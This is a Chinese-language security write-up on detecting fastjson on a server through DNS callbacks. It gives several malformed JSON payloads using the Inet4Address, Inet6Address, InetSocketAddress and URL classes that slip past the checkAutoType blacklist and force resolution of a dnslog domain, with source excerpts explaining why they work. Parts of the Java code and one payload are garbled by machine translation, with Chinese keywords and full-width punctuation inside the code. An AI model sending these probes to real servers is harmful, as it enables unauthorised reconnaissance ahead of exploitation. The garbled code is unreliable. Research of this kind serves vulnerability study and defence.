<html><head><meta charset="utf-8" /><style>.pydocx-caps {text-transform:uppercase}.pydocx-center {text-align:center}.pydocx-comment {color:blue}.pydocx-delete {color:red;text-decoration:line-through}.pydocx-hidden {visibility:hidden}.pydocx-insert {color:green}.pydocx-left {text-align:left}.pydocx-list-style-type-cardinalText {list-style-type:decimal}.pydocx-list-style-type-decimal {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedCircle {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedFullstop {list-style-type:decimal}.pydocx-list-style-type-decimalEnclosedParen {list-style-type:decimal}.pydocx-list-style-type-decimalZero {list-style-type:decimal-leading-zero}.pydocx-list-style-type-lowerLetter {list-style-type:lower-alpha}.pydocx-list-style-type-lowerRoman {list-style-type:lower-roman}.pydocx-list-style-type-none {list-style-type:none}.pydocx-list-style-type-ordinalText {list-style-type:decimal}.pydocx-list-style-type-upperLetter {list-style-type:upper-alpha}.pydocx-list-style-type-upperRoman {list-style-type:upper-roman}.pydocx-right {text-align:right}.pydocx-small-caps {font-variant:small-caps}.pydocx-strike {text-decoration:line-through}.pydocx-tab {display:inline-block;width:4em}.pydocx-underline {text-decoration:underline}body {margin:0px auto}</style></head><body><h1>通过Dnslog判断是否使用fastjson</h1><h2>方法一：利用java.net.Inet [4 | 6]地址</h2><p>很早之前有一个方法是使用java.net.InetAddress类，现在这个类已经列入黑名单。而在翻阅fastjson最新版源码（v1.2.67）时，发现两个类没有在黑名单中，于是可以构造了如下有效载荷，可以使fastjson进行DNS解析。下面以java.net.Inet4Address为例分析构造原理。</p><p>{"@type":"java.net.Inet4Address","val":"dnslog"}<br />{"@type":"java.net.Inet6Address","val":"dnslog"}</p><p>我们知道在fastjson在反序列化之前都会调用checkAutoType方法对类进行检查。通过调试发现，由于java.net.Inet4Address不在黑名单中，所以就算开启AutoType也是能过1处的检查。</p><p>fastjson的ParserConfig类自己维护了一个IdentityHashMap，在这个HashMap中的类会被认为是安全的。在2处可以在IdentityHashMap中可以获取到java.net.Inet4Address，所以clazz不为null，导致在3处就返回了。跳过了后续的未开启AutoType的黑名单检查。所以可以发现无论AutoType是否开启，都可以过checkAutoType的检查</p><p>//com.alibaba.fastjson.parser.ParserConfig#checkAutoType<br />public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) {<br />    ...<br />    Class clazz;<br /><br />    // 1.当打开了autoTypeSupport,类名又不在白名单时进行的黑名单检查<br />    if (!internalWhite &amp;&amp; (this.autoTypeSupport || expectClassFlag)) {<br />        hash = h3;<br /><br />        for(mask = 3; mask &lt; className.length(); ++mask) {<br />            hash ^= (long)className.charAt(mask);<br />            hash *= 1099511628211L;<br />            ....<br />            if (Arrays.binarySearch(this.denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null &amp;&amp; Arrays.binarySearch(this.acceptHashCodes, fullHash) &lt; 0) {<br />                throw new JSONException("autoType is not support. " + typeName);<br />            }<br />        }<br />    }<br /><br /><br />    clazz = TypeUtils.getClassFromMapping(typeName);<br />    if (clazz == null) {<br />        // 2. fastjson的ParserConfig类自己维护了一个IdentityHashMap在这个HashMap中的类会被认为是安全的，会直接被返回。<br />        clazz = this.deserializers.findClass(typeName);<br />    }<br /><br />    if (clazz == null) {<br />        clazz = (Class)this.typeMapping.get(typeName);<br />    }<br /><br />    if (internalWhite) {<br />        clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, true);<br />    }<br /><br />    if (clazz != null) {<br />        if (expectClass != null &amp;&amp; clazz != HashMap.class &amp;&amp; !expectClass.isAssignableFrom(clazz)) {<br />            throw new JSONException("type not match. " + typeName + " -&gt; " + expectClass.getName());<br />        } else {<br />            // 3. 直接返回，不再走下面的autoTypeSupport和黑名单检查<br />            return clazz;<br />        }<br />    } else {<br />        // 4. 不开启autoType时，进行的黑名单检查<br />        if (!this.autoTypeSupport) {<br />            hash = h3;<br /><br />            for(mask = 3; mask &lt; className.length(); ++mask) {<br />                char c = className.charAt(mask);<br />                hash ^= (long)c;<br />                hash *= 1099511628211L;<br />                if (Arrays.binarySearch(this.denyHashCodes, hash) &gt;= 0) {<br />                    throw new JSONException("autoType is not support. " + typeName);<br />                }<br />                ...<br />            }<br />        }<br />    }    <br />    ...<br />}</p><p>fastjason对于Inet4Address类会使用MiscCodec这个ObjectDeserializer来反序列化。跟进发现解析器会取回val变量的值赋值给strVal变量，由于我们的类是Inet4Address，所以它们会执行到1处，进行域名解析。</p><p>//com.alibaba.fastjson.serializer.MiscCodec#deserialze <br />public &lt;T&gt; T deserialze（DefaultJSONParser parser，Type clazz，Object fieldName）{ <br />        ... <br />        objVal = parser.parse（）; <br />         ... <br />        strVal =（String）objVal; <br />        if（strVal！= null &amp;&amp; strVal.length（）！= 0）{ <br />            if（clazz == UUID.class）{ <br />                ... <br />            } else if（clazz == URI.class）{ <br />                ... <br />            } else if（clazz == URL.class）{ <br />                ... <br />            } else if（clazz == Pattern.class）{ <br />                ... <br />            } else if（clazz == Locale.class）{ <br />                ...<br />            } else if（clazz == SimpleDateFormat.class）{ <br />                ... <br />            } else if（clazz！= InetAddress.class &amp;&amp; clazz！= Inet4Address.class &amp;&amp; clazz！= Inet6Address.class）{ <br />                ... <br />            } else { <br />                试试{ <br />                    / / 1.将strVal作为主机名，获取其对应的IP，域名在此处被解析<br />                    返回InetAddress.getByName（strVal）; <br />                } catch（UnknownHostException var11）{ <br />                    抛出新的JSONException（“反序列化inet地址错误”，var11）; <br />                } <br />            } <br />        }其他{ <br />            返回null; <br />        } <br />}</p><h2>方法二：利用java.net.InetSocketAddress</h2><p>java.net.InetSocketAddress类也在IdentityHashMap中，和上面一样无视checkAutoType检查。</p><p>通过它要走到InetAddress.getByName()流程计量方法一是要绕过一些路的。刚开始一直没构造出来，后来在和实验室的@背影师傅交流时，才知道可以顺着解析器规则构造（它要啥就给它啥），最终有效载荷如下，当然它是畸形的json。</p><p>{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}</p><p>那这个是怎样构造出来的呢？这需要简单了解下fastjson的词法分析器了，这里就不展开了。这里尤为关键的是解析器token值对应的含义，可以在com.alibaba.fastjson.parser.JSONToken类中看到它们。</p><p>//com.alibaba.fastjson.parser.JSONToken<br />public class JSONToken {<br />    ...<br />    public static String name(int value) {<br />        switch(value) {<br />        case 1:<br />            return "error";<br />        case 2:<br />            return "int";<br />        case 3:<br />            return "float";<br />        case 4:<br />            return "string";<br />        case 5:<br />            return "iso8601";<br />        case 6:<br />            return "true";<br />        case 7:<br />            return "false";<br />        case 8:<br />            return "null";<br />        case 9:<br />            return "new";<br />        case 10:<br />            return "(";<br />        case 11:<br />            return ")";<br />        case 12:<br />            return "{";<br />        case 13:<br />            return "}";<br />        case 14:<br />            return "[";<br />        case 15:<br />            return "]";<br />        case 16:<br />            return ",";<br />        case 17:<br />            return ":";<br />        case 18:<br />            return "ident";<br />        case 19:<br />            return "fieldName";<br />        case 20:<br />            return "EOF";<br />        case 21:<br />            return "Set";<br />        case 22:<br />            return "TreeSet";<br />        case 23:<br />            return "undefined";<br />        case 24:<br />            return ";";<br />        case 25:<br />            return ".";<br />        case 26:<br />            return "hex";<br />        default:<br />            return "Unknown";<br />        }<br />    }<br />}</p><p>构造这个payload需要分两步，第一步我们需要让代码执行到1处，这一路解析器要接收的字符在代码已经标好。按照顺序写就是{"@type":"java.net.InetSocketAddress"{"address":</p><p>//com.alibaba.fastjson.serializer.MiscCodec#deserialze<br />public &lt;T&gt; T deserialze(DefaultJSONParser parser, Type clazz, Object fieldName) {<br />        JSONLexer lexer = parser.lexer;<br />        String className;<br />        if (clazz == InetSocketAddress.class) {<br />            if (lexer.token() == 8) {<br />                lexer.nextToken();<br />                return null;<br />            } else {<br />                // 12 ---&gt; {<br />                parser.accept(12);<br />                InetAddress address = null;<br />                int port = 0;<br /><br />                while(true) {<br />                    className = lexer.stringVal();<br />                    <br />                    lexer.nextToken(17);<br />                    // 字段名需要为address<br />                    if (className.equals("address")) {<br />                        // 17 ---&gt; :<br />                        parser.accept(17);<br />                        // 1. 我们需要让解析器走到这里<br />                        address = (InetAddress)parser.parseObject(InetAddress.class);<br />                    } <br />                    ...<br />                }<br />            }<br />        } <br />        ...<br />}</p><p>parser.parseObject(InetAddress.class)最终依然会，调用MiscCodec#deserialze()方法来序列化，这里就来到了我们构造payload的第二步。第二步的目标是要让解析器走到InetAddress.getByName(strVal)。解析器要接受的字符在代码里标好了，并按顺序写就是,"val":"http://dnslog"}。</p><p>//com.alibaba.fastjson.serializer.MiscCodec#deserialze<br />public &lt;T&gt; T deserialze(DefaultJSONParser parser, Type clazz, Object fieldName) {<br />        JSONLexer lexer = parser.lexer;<br />        String className;<br />        // 序列化的是InetAddress.class类，走else流程<br />        if (clazz == InetSocketAddress.class) {<br />            ...<br />        } else {<br />            Object objVal;<br />            if (parser.resolveStatus == 2) {<br />                parser.resolveStatus = 0;<br />                // 16 ---&gt; ,<br />                parser.accept(16);<br />                if (lexer.token() != 4) {<br />                    throw new JSONException("syntax error");<br />                }<br />                // 字段名 ---&gt; val<br />                if (!"val".equals(lexer.stringVal())) {<br />                    throw new JSONException("syntax error");<br />                }<br /><br />                lexer.nextToken();<br />                // 17 ---&gt; :<br />                parser.accept(17);<br />                // 之后解析为对象,也就是val字段对应的值<br />                objVal = parser.parse();<br />                // 13 ---&gt; }<br />                parser.accept(13);<br />            } <br />            ....<br />           // 后续的流程和方法一一样了，进行类型判断<br />           strVal = (String)objVal;<br />           if (strVal != null &amp;&amp; strVal.length() != 0) {<br />            if (clazz == UUID.class) {<br />                ...<br />            } else if (clazz == URI.class) {<br />                ...<br />            } else if (clazz == URL.class) {<br />                ...<br />            } else if (clazz != InetAddress.class &amp;&amp; clazz != Inet4Address.class &amp;&amp; clazz != Inet6Address.class) {<br />                ...<br />            } else {<br />                try {<br />                // 域名解析<br />                    return InetAddress.getByName(strVal);<br />                } catch (UnknownHostException var11) {<br />                    throw new JSONException("deserialize inet adress error", var11);<br />                }<br />            }<br />        } <br />}</p><p>两段合起来就得到了最终的有效载荷。</p><h2>方法三：利用java.net.URL</h2><p>java.net.URL类也在IdentityHashMap中，和上面一样无视checkAutoType检查。</p><p>{{“ @type”：“ java.net.URL”，“ val”：“ http：// dnslog”}：“ x”}</p><p>来源于@retanoj状语从句：@threedr3am两位师傅的启发，其原理和ysoserial的中URLDNS这个小工具的原理一样。</p><p><strong>简单来说就是向HashMap压入一个键值对时，HashMap需要获取键对象的哈希码。当键对象是一个URL对象时，在获取它的</strong><strong>hashcode</strong><strong>期间会调用</strong><strong>getHostAddress</strong><strong>方法获取主机，这个过程域名会被解析。</strong></p><p>2 1.png</p><p>URL对象hashcode的获取过程</p><p>fastjson解析上述payload时，先反序列化出URL(http://dnslog)对象，然后将{URL(http://dnslog):"x"}解析为一个HashMap，域名被解析。</p><p>@retanoj在<a href="https://github.com/alibaba/fastjson/issues/3077">问题</a>中还构造了好几个畸形的有效载荷，虽然原理都是一样的，但还是挺有意思的，意识到了师傅对fastjson词法分析器透彻的理解。</p><p>{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}<br />Set[{"@type":"java.net.URL","val":"http://dnslog"}]<br />Set[{"@type":"java.net.URL","val":"http://dnslog"}<br />{{"@type":"java.net.URL","val":"http://dnslog"}:0</p><h2>参考链接</h2><p>https://www.adminxe.com/1037.html</p></body></html>